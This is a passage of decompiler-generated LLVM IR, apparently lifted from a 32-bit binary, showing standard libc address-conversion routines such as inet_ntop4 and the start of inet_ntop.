dec_label_pc_80565d1:                             ; preds = %dec_label_pc_80565ca
  %v5_80565d1 = icmp eq i8* %stack_var_-44.1, null
  %v1_80565d6 = icmp eq i1 %v5_80565d1, false
  br i1 %v1_80565d6, label %dec_label_pc_80566ee, label %dec_label_pc_80565dc

dec_label_pc_80565dc:                             ; preds = %dec_label_pc_80565d1
  %v0_80565dc = load i32, i32* @ebx, align 4
  %v5_80565dc = inttoptr i32 %v0_80565dc to i8*
  %v5_80565e0 = inttoptr i32 %v1_80565a2 to i8*
  br label %dec_label_pc_805664e

dec_label_pc_80565e6:                             ; preds = %dec_label_pc_80565ca
  %v1_80565e6 = inttoptr i32 %v1_80565a2 to i8*
  %v2_80565e6 = load i8, i8* %v1_80565e6, align 1
  %v3_80565e6 = icmp eq i8 %v2_80565e6, 0
  br i1 %v3_80565e6, label %dec_label_pc_80566ee, label %dec_label_pc_80565ef

dec_label_pc_80565ef:                             ; preds = %dec_label_pc_80565e6
  %v0_80565ef = load i32, i32* @ebx, align 4
  %v1_80565ef = add i32 %v0_80565ef, 2
  store i32 %v1_80565ef, i32* @edx, align 4
  %v6_80565f6 = icmp ugt i32 %v1_80565ef, %v2_805656e
  br i1 %v6_80565f6, label %dec_label_pc_80566ee, label %dec_label_pc_80565fc

dec_label_pc_80565fc:                             ; preds = %dec_label_pc_80565ef
  %v0_80565fc = load i32, i32* @ebp, align 4
  %v2_80565fe = udiv i32 %v0_80565fc, 256
  %v4_80565fe = trunc i32 %v2_80565fe to i8
  %v3_8056601 = inttoptr i32 %v0_80565ef to i8*
  store i8 %v4_80565fe, i8* %v3_8056601, align 1
  %v0_8056603 = load i32, i32* @ebp, align 4
  store i32 %v0_8056603, i32* %eax.global-to-local, align 4
  %v1_8056605 = trunc i32 %v0_8056603 to i8
  %v2_8056605 = load i32, i32* @ebx, align 4
  %v3_8056605 = add i32 %v2_8056605, 1
  %v4_8056605 = inttoptr i32 %v3_8056605 to i8*
  store i8 %v1_8056605, i8* %v4_8056605, align 1
  %v0_8056608 = load i32, i32* @edx, align 4
  store i32 %v0_8056608, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805660e

dec_label_pc_805660e:                             ; preds = %dec_label_pc_805655d, %dec_label_pc_805657d, %dec_label_pc_80565fc
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_80565fc ], [ %v1_805657d, %dec_label_pc_805657d ], [ %v0_8056578, %dec_label_pc_805655d ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_80565fc ], [ null, %dec_label_pc_805657d ], [ null, %dec_label_pc_805655d ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805664e.outer

dec_label_pc_805661a:                             ; preds = %dec_label_pc_80565c5
  %v9_805661a = icmp eq i32 %v0_80565c5, 46
  %v1_805661d = icmp eq i1 %v9_805661a, false
  br i1 %v1_805661d, label %dec_label_pc_80566ee, label %dec_label_pc_8056623

dec_label_pc_8056623:                             ; preds = %dec_label_pc_805661a
  %v0_8056623 = load i32, i32* @ebx, align 4
  %v1_8056623 = add i32 %v0_8056623, 4
  store i32 %v1_8056623, i32* @esi, align 4
  %v6_805662a = icmp ugt i32 %v1_8056623, %v2_805656e
  br i1 %v6_805662a, label %dec_label_pc_80566ee, label %dec_label_pc_8056630

dec_label_pc_8056630:                             ; preds = %dec_label_pc_8056623
  store i32 %v0_8056623, i32* @edx, align 4
  %v4_8056632 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8056632, i32* @eax, align 4
  %v2_8056636 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8056636 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8056636, i32 %v2_805656e)
  store i32 %v5_8056636, i32* %eax.global-to-local, align 4
  %v0_805663b = load i32, i32* @esi, align 4
  %tmp61 = icmp slt i32 %v5_8056636, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8056685, label %dec_label_pc_80566ee

dec_label_pc_805664e:                             ; preds = %dec_label_pc_805664e.outer, %dec_label_pc_80565dc
  %v0_8056651 = phi i32 [ %v1_80565a2, %dec_label_pc_80565dc ], [ %v0_805665136, %dec_label_pc_805664e.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_80565dc, %dec_label_pc_80565dc ], [ %stack_var_-44.1.ph, %dec_label_pc_805664e.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_80565e0, %dec_label_pc_80565dc ], [ %stack_var_-36.1.ph, %dec_label_pc_805664e.outer ]
  %v1_8056651 = inttoptr i32 %v0_8056651 to i8*
  %v2_8056651 = load i8, i8* %v1_8056651, align 1
  %v3_8056651 = sext i8 %v2_8056651 to i32
  store i32 %v3_8056651, i32* %eax.global-to-local, align 4
  %v2_8056655 = call i32 @__GI_tolower(i32 %v3_8056651)
  store i32 %v2_8056655, i32* %eax.global-to-local, align 4
  store i32 %v2_8056655, i32* @esi, align 4
  %v1_805665f = icmp eq i32 %v2_8056655, 0
  %v1_8056661 = icmp eq i1 %v1_805665f, false
  br i1 %v1_8056661, label %dec_label_pc_8056595, label %dec_label_pc_8056667

dec_label_pc_8056667:                             ; preds = %dec_label_pc_805664e
  %v0_80566bd.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_80565ca, label %dec_label_pc_8056685, label %dec_label_pc_805666e

dec_label_pc_805666e:                             ; preds = %dec_label_pc_8056667
  %v1_805666e = add i32 %v0_80566bd.pre.pre, 2
  store i32 %v1_805666e, i32* @edx, align 4
  %v6_8056675 = icmp ugt i32 %v1_805666e, %v2_805656e
  br i1 %v6_8056675, label %dec_label_pc_80566ee, label %dec_label_pc_8056677

dec_label_pc_8056677:                             ; preds = %dec_label_pc_805666e
  %v0_8056677 = load i32, i32* @ebp, align 4
  %v2_8056679 = udiv i32 %v0_8056677, 256
  %v4_8056679 = trunc i32 %v2_8056679 to i8
  %v3_805667c = inttoptr i32 %v0_80566bd.pre.pre to i8*
  store i8 %v4_8056679, i8* %v3_805667c, align 1
  %v0_805667e = load i32, i32* @ebp, align 4
  store i32 %v0_805667e, i32* %eax.global-to-local, align 4
  %v1_8056680 = trunc i32 %v0_805667e to i8
  %v2_8056680 = load i32, i32* @ebx, align 4
  %v3_8056680 = add i32 %v2_8056680, 1
  %v4_8056680 = inttoptr i32 %v3_8056680 to i8*
  store i8 %v1_8056680, i8* %v4_8056680, align 1
  %v0_8056683 = load i32, i32* @edx, align 4
  br label %dec_label_pc_8056685

dec_label_pc_8056685:                             ; preds = %dec_label_pc_8056667, %dec_label_pc_8056630, %dec_label_pc_8056677
  %v0_80566bd.pre = phi i32 [ %v0_805663b, %dec_label_pc_8056630 ], [ %v0_8056683, %dec_label_pc_8056677 ], [ %v0_80566bd.pre.pre, %dec_label_pc_8056667 ]
  %v4_8056685 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8056685 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8056685, label %dec_label_pc_80566bd, label %dec_label_pc_805668c

dec_label_pc_805668c:                             ; preds = %dec_label_pc_8056685
  store i32 1, i32* @esi, align 4
  %v6_8056693 = sub i32 %v0_80566bd.pre, %v4_8056685
  store i32 %v6_8056693, i32* @edi, align 4
  %v16_8056697 = icmp eq i32 %v0_80566bd.pre, %v2_805656e
  %v1_805669b = icmp eq i1 %v16_8056697, false
  br i1 %v1_805669b, label %dec_label_pc_80566b5.preheader, label %dec_label_pc_80566ee

dec_label_pc_80566b5.preheader:                   ; preds = %dec_label_pc_805668c
  %v3_80566b594 = inttoptr i32 %v6_8056693 to i8*
  %v9_80566b797 = icmp slt i8* %v3_80566b594, inttoptr (i32 1 to i8*)
  br i1 %v9_80566b797, label %dec_label_pc_80566bd.thread, label %dec_label_pc_805669f

dec_label_pc_805669f:                             ; preds = %dec_label_pc_80566b5.preheader, %dec_label_pc_805669f
  %v0_80566ad99 = phi i32 [ %v0_80566b5.pre, %dec_label_pc_805669f ], [ 1, %dec_label_pc_80566b5.preheader ]
  %v0_805669f98 = phi i32 [ %v1_80566b5.pre, %dec_label_pc_805669f ], [ %v6_8056693, %dec_label_pc_80566b5.preheader ]
  %v2_80566a5 = sub i32 %v0_805669f98, %v0_80566ad99
  %v2_80566a7 = sub i32 %v2_805656e, %v0_80566ad99
  %v6_80566a9 = add i32 %v2_80566a5, %v4_8056685
  store i32 %v6_80566a9, i32* %eax.global-to-local, align 4
  %v1_80566ad = add i32 %v0_80566ad99, 1
  store i32 %v1_80566ad, i32* @esi, align 4
  %v1_80566ae = inttoptr i32 %v6_80566a9 to i8*
  %v2_80566ae = load i8, i8* %v1_80566ae, align 1
  %v3_80566ae = zext i8 %v2_80566ae to i32
  %v4_80566ae = load i32, i32* @edx, align 4
  %v5_80566ae = and i32 %v4_80566ae, -256
  %v6_80566ae = or i32 %v5_80566ae, %v3_80566ae
  store i32 %v6_80566ae, i32* @edx, align 4
  %v3_80566b0 = inttoptr i32 %v2_80566a7 to i8*
  store i8 %v2_80566ae, i8* %v3_80566b0, align 1
  %v0_80566b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80566b2 = inttoptr i32 %v0_80566b2 to i8*
  store i8 0, i8* %v1_80566b2, align 1
  %v0_80566b5.pre = load i32, i32* @esi, align 4
  %v1_80566b5.pre = load i32, i32* @edi, align 4
  %v2_80566b5 = inttoptr i32 %v0_80566b5.pre to i8*
  %v3_80566b5 = inttoptr i32 %v1_80566b5.pre to i8*
  %v9_80566b7 = icmp sgt i8* %v2_80566b5, %v3_80566b5
  br i1 %v9_80566b7, label %dec_label_pc_80566bd.thread, label %dec_label_pc_805669f

dec_label_pc_80566bd.thread:                      ; preds = %dec_label_pc_805669f, %dec_label_pc_80566b5.preheader
  br label %dec_label_pc_80566c3

dec_label_pc_80566bd:                             ; preds = %dec_label_pc_8056685
  %v16_80566bd = icmp eq i32 %v0_80566bd.pre, %v2_805656e
  %v1_80566c1 = icmp eq i1 %v16_80566bd, false
  br i1 %v1_80566c1, label %dec_label_pc_80566ee, label %dec_label_pc_80566c3

dec_label_pc_80566c3:                             ; preds = %dec_label_pc_80566bd.thread, %dec_label_pc_80566bd
  store i32 %v2_8056562, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_80566cf = call i32 @memcpy(i16* %tmp63, i32 %v2_8056562, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566f0

dec_label_pc_80566de:                             ; preds = %dec_label_pc_8056542
  %v1_80566de = call i32 @__errno_location(i32 %v0_8056531)
  %v1_80566e3 = inttoptr i32 %v1_80566de to i32*
  store i32 97, i32* %v1_80566e3, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566f0

dec_label_pc_80566ee:                             ; preds = %dec_label_pc_80565ef, %dec_label_pc_80565e6, %dec_label_pc_80565aa, %dec_label_pc_80565d1, %dec_label_pc_805668c, %dec_label_pc_8056630, %dec_label_pc_80566bd, %dec_label_pc_805666e, %dec_label_pc_8056623, %dec_label_pc_805661a, %dec_label_pc_805657d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566f0

dec_label_pc_80566f0:                             ; preds = %dec_label_pc_80566de, %dec_label_pc_80566c3, %dec_label_pc_805654d, %dec_label_pc_80566ee
  %v0_80566f7 = phi i32 [ -1, %dec_label_pc_80566de ], [ 1, %dec_label_pc_80566c3 ], [ %v3_8056553, %dec_label_pc_805654d ], [ 0, %dec_label_pc_80566ee ]
  store i32 %v0_8056531, i32* @ebx, align 4
  store i32 %v0_8056530, i32* @esi, align 4
  store i32 %v0_805652f, i32* @edi, align 4
  store i32 %v0_805652e, i32* @ebp, align 4
  ret i32 %v0_80566f7

; uselistorder directives
  uselistorder i32 %v1_80566b5.pre, { 1, 0 }
  uselistorder i32 %v0_80566b5.pre, { 1, 0 }
  uselistorder i32 %v0_80566ad99, { 2, 1, 0 }
  uselistorder i32 %v0_80566bd.pre, { 2, 1, 0 }
  uselistorder i32 %v0_80566bd.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8056655, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_80565a2, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_805656e, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8056531, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80566f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80566ee, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_80566c3, { 1, 0 }
  uselistorder label %dec_label_pc_805669f, { 1, 0 }
  uselistorder label %dec_label_pc_8056685, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805664e, { 1, 0 }
  uselistorder label %dec_label_pc_805660e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805664e.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_80566f9 = load i32, i32* @edi, align 4
  %v0_80566fa = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_8056702 = load i32, i32* @eax, align 4
  %v3_8056706 = and i32 %v0_8056702, -65536
  store i32 %v3_8056706, i32* %stack_var_-33, align 4
  %v2_8056711 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8056717 = load i32, i32* @edx, align 4
  %v5_8056717 = inttoptr i32 %v0_8056717 to i8*
  store i8* %v5_8056717, i8** %stack_var_-60, align 4
  %v0_805671b = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8056721 = add i32 %v2_8056711, 4
  store i32 %v6_8056721, i32* %edi.global-to-local, align 4
  %v2_8056722 = inttoptr i32 %v6_8056721 to i32*
  store i32 0, i32* %v2_8056722, align 4
  %v3_8056722 = load i32, i32* %edi.global-to-local, align 4
  %v6_8056722 = add i32 %v3_8056722, 4
  store i32 %v6_8056722, i32* %edi.global-to-local, align 4
  %v0_8056723 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056723 = inttoptr i32 %v6_8056722 to i32*
  store i32 %v0_8056723, i32* %v2_8056723, align 4
  %v3_8056723 = load i32, i32* %edi.global-to-local, align 4
  %v6_8056723 = add i32 %v3_8056723, 4
  store i32 %v6_8056723, i32* %edi.global-to-local, align 4
  %v0_8056724 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056724 = trunc i32 %v0_8056724 to i16
  %v3_8056724 = inttoptr i32 %v6_8056723 to i16*
  store i16 %v1_8056724, i16* %v3_8056724, align 2
  %v4_8056724 = load i32, i32* %edi.global-to-local, align 4
  %v7_8056724 = add i32 %v4_8056724, 2
  store i32 %v7_8056724, i32* %edi.global-to-local, align 4
  %v0_8056726 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056726 = trunc i32 %v0_8056726 to i8
  %v3_8056726 = inttoptr i32 %v7_8056724 to i8*
  store i8 %v1_8056726, i8* %v3_8056726, align 1
  %v0_80567b626 = load i32, i32* %ebp.global-to-local, align 4
  %v7_80567b929 = icmp sgt i32 %v0_80567b626, 3
  br i1 %v7_80567b929, label %dec_label_pc_80567bf, label %dec_label_pc_805672c

dec_label_pc_805672c:                             ; preds = %entry, %dec_label_pc_8056794
  %v0_80567b630 = phi i32 [ %v0_80567b6, %dec_label_pc_8056794 ], [ %v0_80567b626, %entry ]
  %v0_8056730 = load i32, i32* @ecx, align 4
  %v1_8056730 = and i32 %v0_8056730, -256
  %v2_8056730 = or i32 %v1_8056730, 100
  store i32 %v2_8056730, i32* %ecx.global-to-local, align 4
  %v2_8056732 = add i32 %v0_80567b630, %v0_8056702
  store i32 %v2_8056732, i32* %eax.global-to-local, align 4
  %v0_8056734 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056734 = add i32 %v0_8056734, 1
  store i32 %v1_8056734, i32* @esi, align 4
  store i32 %v0_8056734, i32* @edi, align 4
  %v1_805673d = inttoptr i32 %v2_8056732 to i8*
  %v2_805673d = load i8, i8* %v1_805673d, align 1
  %v3_805673d = zext i8 %v2_805673d to i32
  %v4_805673d = load i32, i32* @edx, align 4
  %v5_805673d = and i32 %v4_805673d, -65536
  %v6_805673d = or i32 %v5_805673d, %v3_805673d
  store i32 %v6_805673d, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_805673d, 100
  %v6_8056743 = zext i8 %div to i32
  %v4_8056745 = or i32 %v6_8056743, %v1_8056730
  store i32 %v4_8056745, i32* %ecx.global-to-local, align 4
  %v1_8056747 = or i32 %v4_8056745, 48
  store i32 %v1_8056747, i32* %eax.global-to-local, align 4
  %v1_805674a = trunc i32 %v1_8056747 to i8
  %v2_805674a = load i32, i32* @esp, align 4
  %v4_805674a = add i32 %v0_8056734, 43
  %v5_805674a = add i32 %v4_805674a, %v2_805674a
  %v6_805674a = inttoptr i32 %v5_805674a to i8*
  store i8 %v1_805674a, i8* %v6_805674a, align 1
  %v0_805674e = load i32, i32* %eax.global-to-local, align 4
  %v1_805674e = trunc i32 %v0_805674e to i8
  %v7_805674e = icmp eq i8 %v1_805674e, 48
  %v1_8056750 = icmp eq i1 %v7_805674e, false
  %v0_8056776 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056776 = and i32 %v0_8056776, -256
  %v2_8056776 = or i32 %v1_8056776, 10
  store i32 %v2_8056776, i32* %ecx.global-to-local, align 4
  %v0_8056778 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8056778, i32* %eax.global-to-local, align 4
  %v3_805677a = trunc i32 %v0_8056778 to i16
  %v5_805677a = udiv i16 %v3_805677a, 10
  br i1 %v1_8056750, label %dec_label_pc_8056776, label %dec_label_pc_8056752

dec_label_pc_8056752:                             ; preds = %dec_label_pc_805672c
  %v9_8056756 = and i32 %v0_8056778, -65536
  %tmp = urem i16 %v5_805677a, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_8056763 = zext i16 %div32 to i32
  %v11_8056763 = or i32 %v7_8056763, %v9_8056756
  store i32 %v11_8056763, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_8056763 = zext i16 %tmp34 to i32
  %v1_8056766 = or i32 %v12_8056763, 48
  %v8_8056766 = trunc i32 %v1_8056766 to i8
  store i32 %v1_8056766, i32* %edx.global-to-local, align 4
  %v2_8056769 = load i32, i32* @esp, align 4
  %v3_8056769 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8056769 = add i32 %v2_8056769, 43
  %v5_8056769 = add i32 %v4_8056769, %v3_8056769
  %v6_8056769 = inttoptr i32 %v5_8056769 to i8*
  store i8 %v8_8056766, i8* %v6_8056769, align 1
  %v0_805676d = load i32, i32* %edx.global-to-local, align 4
  %v1_805676d = trunc i32 %v0_805676d to i8
  %v7_805676d = icmp eq i8 %v1_805676d, 48
  br i1 %v7_805676d, label %dec_label_pc_8056794, label %dec_label_pc_8056772

dec_label_pc_8056772:                             ; preds = %dec_label_pc_8056752
  %v0_8056772 = load i32, i32* @esi, align 4
  store i32 %v0_8056772, i32* @edi, align 4
  br label %dec_label_pc_8056794

dec_label_pc_8056776:                             ; preds = %dec_label_pc_805672c
  %tmp35 = urem i16 %v5_805677a, 256
  %v3_805677c = and i32 %v0_8056778, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_8056787 = zext i16 %div33 to i32
  %v11_8056787 = or i32 %v7_8056787, %v3_805677c
  store i32 %v11_8056787, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_8056787 = zext i16 %tmp36 to i32
  %v1_805678a = or i32 %v12_8056787, 48
  %v8_805678a = trunc i32 %v1_805678a to i8
  store i32 %v1_805678a, i32* %edx.global-to-local, align 4
  %v0_805678d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805678d = add i32 %v0_805678d, 2
  store i32 %v1_805678d, i32* @edi, align 4
  %v2_8056790 = load i32, i32* @esp, align 4
  %v3_8056790 = load i32, i32* @esi, align 4
  %v4_8056790 = add i32 %v2_8056790, 43
  %v5_8056790 = add i32 %v4_8056790, %v3_8056790
  %v6_8056790 = inttoptr i32 %v5_8056790 to i8*
  store i8 %v8_805678a, i8* %v6_8056790, align 1
  br label %dec_label_pc_8056794

dec_label_pc_8056794:                             ; preds = %dec_label_pc_8056752, %dec_label_pc_8056772, %dec_label_pc_8056776
  store i32 %v2_8056732, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_805679d = load i32, i32* @edi, align 4
  %v1_805679d = add i32 %v0_805679d, 2
  store i32 %v1_805679d, i32* %ebx.global-to-local, align 4
  %v0_80567a0 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80567a0 = add i32 %v0_80567a0, 1
  store i32 %v1_80567a0, i32* %ebp.global-to-local, align 4
  %v2_80567a1 = load i8, i8* %v1_805673d, align 1
  %v3_80567a1 = zext i8 %v2_80567a1 to i32
  %v4_80567a1 = load i32, i32* %eax.global-to-local, align 4
  %v5_80567a1 = and i32 %v4_80567a1, -65536
  %v6_80567a1 = or i32 %v5_80567a1, %v3_80567a1
  store i32 %v6_80567a1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_80567a7 = load i32, i32* @esp, align 4
  %v2_80567a7 = add i32 %v0_805679d, 44
  %v3_80567a7 = add i32 %v2_80567a7, %v0_80567a7
  %v4_80567a7 = inttoptr i32 %v3_80567a7 to i8*
  store i8 46, i8* %v4_80567a7, align 1
  %v0_80567ac = load i32, i32* @ecx, align 4
  %v1_80567ac = load i32, i32* %eax.global-to-local, align 4
  %v2_80567ac = urem i32 %v1_80567ac, 65536
  %v3_80567ac = load i32, i32* %edx.global-to-local, align 4
  %v4_80567ac = mul i32 %v3_80567ac, 65536
  %v5_80567ac = or i32 %v4_80567ac, %v2_80567ac
  %v6_80567ac = urem i32 %v0_80567ac, 65536
  %v7_80567ac = udiv i32 %v5_80567ac, %v6_80567ac
  %v8_80567ac = urem i32 %v7_80567ac, 65536
  %v10_80567ac = and i32 %v1_80567ac, -65536
  %v11_80567ac = or i32 %v8_80567ac, %v10_80567ac
  store i32 %v11_80567ac, i32* %eax.global-to-local, align 4
  %v12_80567ac = urem i32 %v5_80567ac, %v6_80567ac
  %v14_80567ac = and i32 %v3_80567ac, -65536
  %v15_80567ac = or i32 %v12_80567ac, %v14_80567ac
  %v1_80567af = add i32 %v15_80567ac, 48
  %v8_80567af = trunc i32 %v1_80567af to i8
  store i32 %v1_80567af, i32* @edx, align 4
  %v2_80567b2 = load i32, i32* @esp, align 4
  %v3_80567b2 = load i32, i32* @edi, align 4
  %v4_80567b2 = add i32 %v2_80567b2, 43
  %v5_80567b2 = add i32 %v4_80567b2, %v3_80567b2
  %v6_80567b2 = inttoptr i32 %v5_80567b2 to i8*
  store i8 %v8_80567af, i8* %v6_80567b2, align 1
  %v0_80567b6 = load i32, i32* %ebp.global-to-local, align 4
  %v7_80567b9 = icmp sgt i32 %v0_80567b6, 3
  br i1 %v7_80567b9, label %dec_label_pc_80567bf, label %dec_label_pc_805672c

dec_label_pc_80567bf:                             ; preds = %dec_label_pc_8056794, %entry
  %v0_80567bf = load i32, i32* @esp, align 4
  %v1_80567bf = load i32, i32* %ebx.global-to-local, align 4
  %v2_80567bf = add i32 %v0_80567bf, 42
  %v3_80567bf = add i32 %v2_80567bf, %v1_80567bf
  %v4_80567bf = inttoptr i32 %v3_80567bf to i8*
  store i8 0, i8* %v4_80567bf, align 1
  %v2_80567c7 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_80567c7, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_80567cc = call i32 @strlen(i8* %tmp23)
  store i32 %v3_80567cc, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_80567cc, %v0_805671b
  br i1 %tmp31, label %dec_label_pc_80567da, label %dec_label_pc_80567e9

dec_label_pc_80567da:                             ; preds = %dec_label_pc_80567bf
  %v0_80567da = load i8*, i8** %stack_var_-92, align 4
  %v1_80567da = ptrtoint i8* %v0_80567da to i32
  %v2_80567da = call i32 @__errno_location(i32 %v1_80567da)
  %v1_80567df = inttoptr i32 %v2_80567da to i32*
  store i32 28, i32* %v1_80567df, align 4
  br label %dec_label_pc_80567f8

dec_label_pc_80567e9:                             ; preds = %dec_label_pc_80567bf
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_80567ec5 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_80567ec5, i32* %tmp25, align 4
  %v0_80567f0.cast = inttoptr i32 %v3_80567ec5 to i8*
  %v4_80567f0 = call i32 @strcpy(i8* %v0_80567f0.cast, i32 %v2_80567c7)
  br label %dec_label_pc_80567f8

dec_label_pc_80567f8:                             ; preds = %dec_label_pc_80567da, %dec_label_pc_80567e9
  %storemerge = phi i32 [ %v4_80567f0, %dec_label_pc_80567e9 ], [ 0, %dec_label_pc_80567da ]
  %v0_80567ff = phi i32 [ %v4_80567f0, %dec_label_pc_80567e9 ], [ 0, %dec_label_pc_80567da ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80566fa, i32* @esi, align 4
  store i32 %v0_80566f9, i32* @edi, align 4
  ret i32 %v0_80567ff

; uselistorder directives
  uselistorder i32 %v0_80567b6, { 1, 0 }
  uselistorder i32 %v3_80567ac, { 1, 0 }
  uselistorder i32 %v1_80567ac, { 1, 0 }
  uselistorder i32 %v1_805678a, { 1, 0 }
  uselistorder i32 %v1_8056766, { 1, 0 }
  uselistorder i32 %v0_8056778, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8056747, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 12, 14, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i32 43, { 3, 4, 5, 6, 1, 7, 2, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 100, { 7, 1, 5, 6, 2, 3, 4, 0 }
  uselistorder i32 -65536, { 3, 4, 5, 1, 0, 6, 7, 8, 12, 2, 9, 10, 11 }
  uselistorder i1* @df, { 5, 34, 35, 0, 1, 36, 37, 38, 43, 2, 3, 26, 4, 48, 49, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 39, 40, 41, 42, 44, 45, 46, 47 }
  uselistorder label %dec_label_pc_80567f8, { 1, 0 }
  uselistorder label %dec_label_pc_8056794, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805672c, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8056801 = load i32, i32* @edi, align 4
  %v0_8056802 = load i32, i32* @esi, align 4
  %v0_8056803 = load i32, i32* @ebx, align 4
  %v15_8056804 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_805680b = icmp eq i32 %arg1, 2
  br i1 %v9_805680b, label %dec_label_pc_805681b, label %dec_label_pc_8056810

dec_label_pc_8056810:                             ; preds = %entry
